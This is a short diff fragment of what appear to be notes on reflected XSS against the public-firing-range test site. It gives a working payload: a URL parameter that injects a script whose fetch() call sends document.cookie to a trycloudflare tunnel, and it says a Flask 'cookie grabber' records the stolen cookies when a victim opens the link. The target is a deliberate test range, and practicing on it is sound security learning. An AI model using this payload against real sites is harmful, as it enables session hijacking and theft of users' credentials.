@@ -9,4 +9,5 @@ https://public-firing-range.appspot.com/reflected/parameter/body/400?q=b<h1>HALL
 
 Try this with a running Flask cookie grabber and a cloudflare tunnel:
 https://public-firing-range.appspot.com/reflected/parameter/body?q=a<script>fetch('https://[IDENTIFIER].trycloudflare.com/grab?c='+encodeURIComponent(document.cookie))</script>
-                                                                                                                
+
+The cookie grabber adds the stolen cookies as soon as the victim opens the modified link and adds a timstamp. 
